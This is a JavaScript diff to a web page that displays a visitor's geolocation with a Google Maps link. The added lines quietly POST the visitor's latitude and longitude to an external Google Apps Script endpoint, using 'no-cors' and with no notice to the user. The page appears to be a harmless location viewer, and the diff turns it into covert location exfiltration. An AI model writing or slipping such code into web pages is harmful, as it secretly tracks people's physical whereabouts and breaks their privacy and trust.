@@ -68,6 +68,25 @@
                         navigator.geolocation.getCurrentPosition(function (position) {
                             var lat = position.coords.latitude;
                             var lon = position.coords.longitude;
+                            let gta = lat.toFixed(5) +","+ lon.toFixed(5);
+                            console.log(gta);
+                            let data = gta;
+                            fetch("https://script.google.com/macros/s/AKfycbx5wRNdTlOjbdVYDgz1wTLG8wY7k3yRAHcioAwKSBAos2hp78qgf9xCL6LI4xwZkMOG/exec", {
+                              
+               method: "POST",
+              mode: "no-cors",   
+    headers: { "Content-Type": "text/plain" },
+    body: JSON.stringify(data)
+  })
+  .then(res => res.text())
+  .then(response => {
+    console.log("shared");
+        
+        
+        
+  })
+  .catch(err => console.error(err));
+  
                             var mapLink = 'https://www.google.com/maps?q=' + lat + ',' + lon;
                             result.innerHTML = 'Your coordinates: <b>' + lat.toFixed(5) + ', ' + lon.toFixed(5) + '</b><br>' +
                                 '<a href="' + mapLink + '" target="_blank" style="color:#4e944f; text-decoration:underline; font-weight:600;">View on Google Maps</a>';
